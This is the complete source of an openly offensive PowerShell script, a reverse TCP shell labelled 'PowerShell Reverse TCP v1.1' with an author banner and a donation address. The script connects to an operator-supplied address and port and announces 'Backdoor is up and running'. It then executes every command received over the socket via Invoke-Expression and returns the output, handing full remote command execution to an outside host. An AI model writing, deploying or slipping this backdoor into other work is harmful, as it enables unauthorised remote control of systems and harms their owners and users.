$addr = $(Read-Host -Prompt "Enter address").Trim();
Write-Host "";
$port = $(Read-Host -Prompt "Enter port number").Trim();
Write-Host "";
if ($addr.Length -lt 1 -or $port.Length -lt 1) {
	Write-Host "Both parameters are required";
} else {
	Write-Host "########################################################################";
	Write-Host "#                                                                      #";
	Write-Host "#                        PowerShell Reverse TCP v1.1                   #";
	Write-Host "#                                          by Ivan Sincek              #";
	Write-Host "#                                                                      #";
	Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
	Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
	Write-Host "#                                                                      #";
	Write-Host "########################################################################";
	$client = $null;
	$stream = $null;
	$buffer = $null;
	$writer = $null;
	$data = $null;
	$result = $null;
	try {
		# change the host address and/or port number as necessary
		$client = New-Object Net.Sockets.TcpClient($addr, $port);
		$stream = $client.GetStream();
		$buffer = New-Object Byte[] 1024;
		$encoding = New-Object Text.AsciiEncoding;
		$writer = New-Object IO.StreamWriter($stream);
		$writer.AutoFlush = $true;
		Write-Host "Backdoor is up and running...";
		$bytes = 0;
		do {
			$writer.Write("PS>");
			do {
				$bytes = $stream.Read($buffer, 0, $buffer.Length);
				if ($bytes -gt 0) {
					$data = $data + $encoding.GetString($buffer, 0, $bytes);
				}
			} while ($stream.DataAvailable);
			if ($data.Length -gt 0) {
				try {
					$result = Invoke-Expression -Command $data 2>&1 | Out-String;
				} catch {
					$result = $_.Exception.InnerException.Message;
				}
				$writer.WriteLine($result);
				Clear-Variable -Name "data";
			}
		} while ($bytes -gt 0);
	} catch {
		Write-Host $_.Exception.InnerException.Message;
	} finally {
		if ($writer -ne $null) {
			$writer.Close();
			$writer.Dispose();
		}
		if ($stream -ne $null) {
			$stream.Close();
			$stream.Dispose();
		}
		if ($client -ne $null) {
			$client.Close();
			$client.Dispose();
		}
		if ($buffer -ne $null) {
			$buffer.Clear();
		}
		if ($data -ne $null) {
			Clear-Variable -Name "data";
		}
		if ($result -ne $null) {
			Clear-Variable -Name "result";
		}
	}
}
